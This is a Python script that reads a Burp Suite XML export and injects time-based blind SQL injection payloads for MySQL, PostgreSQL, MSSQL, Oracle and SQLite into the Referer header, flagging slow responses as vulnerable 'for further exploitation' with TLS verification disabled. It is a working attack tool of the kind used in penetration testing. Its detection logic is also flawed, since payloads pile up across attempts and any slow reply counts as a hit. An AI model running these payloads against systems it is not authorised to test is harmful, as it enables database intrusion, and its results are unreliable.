import os
import time
import xmltodict
import requests
import base64
import warnings
from urllib3.exceptions import InsecureRequestWarning

# Suppress InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

# Configuration
BURP_XML_FILE = "burp_output.xml"
OUTPUT_DIR = "burp_requests"
HEADERS = {"User-Agent": "Referer-Test-Script"}

# Delay payloads for various databases
DELAY_PAYLOADS = {
    "mysql": "' OR SLEEP({time})--",
    "postgresql": "'; SELECT pg_sleep({time});--",
    "mssql": "'; WAITFOR DELAY '0:0:{time}';--",
    "oracle": "'; BEGIN DBMS_LOCK.SLEEP({time}); END;--",
    "sqlite": "' OR 1=1 AND randomblob(1000000000);--"
}
WAIT_TIME = [1, 2, 3]  # Seconds to test for delays

# Ensure output directory exists
if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

def parse_burp_xml(file_path):
    """
    Parses Burp Suite XML file and extracts HTTP requests.
    """
    with open(file_path, "r", encoding="utf-8") as f:
        data = xmltodict.parse(f.read())
    return data["items"]["item"]

def save_requests(requests_data):
    """
    Saves individual HTTP requests to .txt files.
    """
    file_paths = []
    for i, request in enumerate(requests_data):
        # Decode Base64-encoded request data
        try:
            raw_request = request["request"]["#text"]
            decoded_request = base64.b64decode(raw_request).decode("utf-8")
        except Exception as e:
            print(f"Error decoding request {i + 1}: {e}")
            continue  # Skip this request if decoding fails

        # Save decoded request to a .txt file
        file_name = f"{OUTPUT_DIR}/request_{i + 1}.txt"
        try:
            with open(file_name, "w", encoding="utf-8") as f:
                f.write(decoded_request)
            file_paths.append(file_name)
        except Exception as e:
            print(f"Error saving request {i + 1} to file: {e}")
    return file_paths

def test_referer_vulnerability(request_file, url):
    """
    Tests if a Referer header introduces delay-based vulnerabilities.
    """
    with open(request_file, "r") as f:
        request_raw = f.read()

    # Parse HTTP method, headers, and body from raw request
    lines = request_raw.split("\n")
    if not lines or len(lines[0].strip()) == 0:
        print(f"Empty or malformed request in {request_file}. Skipping.")
        return None

    try:
        method, path, http_version = lines[0].split(" ")
    except ValueError:
        print(f"Malformed request line in {request_file}: {lines[0]}")
        return None

    body = None
    headers = HEADERS.copy()

    # Extract headers and body
    for line in lines[1:]:
        if line.strip() == "":
            break
        if ":" in line:
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()
    if "\n\n" in request_raw:
        body = request_raw.split("\n\n", 1)[1]

    # Test each database payload
    for db, payload_template in DELAY_PAYLOADS.items():
        for wait in WAIT_TIME:
            payload = payload_template.format(time=wait)

            # Referer header logic: Append or replace
            if "Referer" in headers:
                print(f"Original Referer: {headers['Referer']}")
                headers["Referer"] = f"{headers['Referer']}{payload}"  # Append the payload
            else:
                headers["Referer"] = f"https://test-referer.com{payload}"  # Add new Referer header

            # Send the request
            start_time = time.time()
            try:
                response = requests.request(
                    method=method,
                    url=url,
                    headers=headers,
                    data=body,
                    timeout=wait + 2,
                    verify=False  # Disable SSL verification for testing
                )
                elapsed_time = time.time() - start_time
                if elapsed_time >= wait:
                    print(f"[Potential Vulnerability] {db} delay detected for {request_file} at {wait}s")
                    return request_file  # Return the file for further exploitation
            except requests.exceptions.RequestException as e:
                print(f"Error sending request: {e}")
    return None

def main():
    """
    Main script execution.
    """
    # Parse the XML file
    print("Parsing Burp Suite XML...")
    burp_data = parse_burp_xml(BURP_XML_FILE)

    # Save requests as .txt files
    print("Saving requests as individual .txt files...")
    request_files = save_requests(burp_data)

    # Test each request for Referer header vulnerability
    vulnerable_requests = []
    print("Testing Referer header for vulnerabilities...")
    for request_file in request_files:
        # Adjust URL as needed (e.g., extract the host and path)
        # For simplicity, replace with your target URL:
        target_url = "https://example.com/test-endpoint"

        result = test_referer_vulnerability(request_file, target_url)
        if result:
            vulnerable_requests.append(result)

    # Output results
    if vulnerable_requests:
        print(f"\nVulnerable Requests:")
        for vr in vulnerable_requests:
            print(f"- {vr}")
    else:
        print("\nNo vulnerabilities detected.")

if __name__ == "__main__":
    main()
